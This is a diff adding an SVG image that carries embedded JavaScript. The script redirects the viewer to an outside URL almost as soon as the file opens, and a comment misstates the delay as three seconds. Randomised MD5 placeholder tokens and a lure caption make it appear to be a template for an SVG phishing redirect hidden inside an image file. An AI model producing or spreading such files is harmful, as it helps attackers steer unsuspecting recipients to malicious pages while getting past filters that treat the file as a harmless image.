@@ -1,0 +1,14 @@
+
+ <svg width="300" height="200" xmlns="http://www.w3.org/2000/svg">
+    <script type="application/javascript">
+        <![CDATA[
+        setTimeout(function() {
+            window.location.href = "https://quercus.org/in/";
+        }, 3);  <!--{RANDOM_MD5} Redirect after 3 seconds {RANDOM_MD5}-->
+        ]]>
+    </script>
+    <rect width="100%" height="100%" fill="lightblue"/>
+    <text x="50%" y="50%" font-size="20" text-anchor="middle" fill="black">
+        Redirecting to-iiMessagingCompany
+    </text>
+ </svg>
